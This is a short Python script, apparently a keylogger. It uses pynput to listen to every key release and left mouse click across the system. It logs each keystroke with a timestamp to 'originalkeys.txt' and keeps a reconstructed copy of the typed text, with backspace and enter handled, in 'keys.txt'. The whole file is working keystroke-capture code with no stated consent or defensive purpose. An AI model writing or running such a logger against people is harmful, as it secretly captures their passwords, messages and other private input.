import pynput
import datetime

def click(x,y,button,ispressed):
    if ispressed==False and button == pynput.mouse.Button.left:
        key = "\n"
        f = open("keys.txt","r")
        keys = f.read()
        f.close()
        arr = keys.split("\n")
        if arr[-1] == "":
            key = ""
        f = open("keys.txt","a")
        f.write(str(key))
        f.close()
def key(key):
    temp = str(datetime.datetime.now()) + "\t:\t" + (str(key)[1] if len(str(key))==3 else str(key)) + "\n"
    f = open("originalkeys.txt","a")
    f.write( temp )
    f.close()
    match(key):
        case pynput.keyboard.Key.space:
            key = " "
        case pynput.keyboard.Key.enter:
            key = "\n"
        case pynput.keyboard.Key.tab:
            key = "\n"
        case pynput.keyboard.Key.shift:
            key = ""
        case pynput.keyboard.Key.backspace:
            f = open("keys.txt","r")
            keys = f.read()
            f.close()
            keys = keys[:-1]
            f = open("keys.txt","w")
            f.write(keys)
            f.close()
            key = ""
        case _:
            key = str(key)[1] if len(str(key))==3 else "\n"+str(key)+"\n"
    if key=="\n":
        f = open("keys.txt","r")
        keys = f.read()
        f.close()
        arr = keys.split("\n")
        if arr[-1] == "":
            key = ""
    f = open("keys.txt","a")
    f.write(str(key))
    f.close()

with pynput.keyboard.Listener(on_release=key) as k, pynput.mouse.Listener(on_click=click) as m:
    k.join()
    m.join()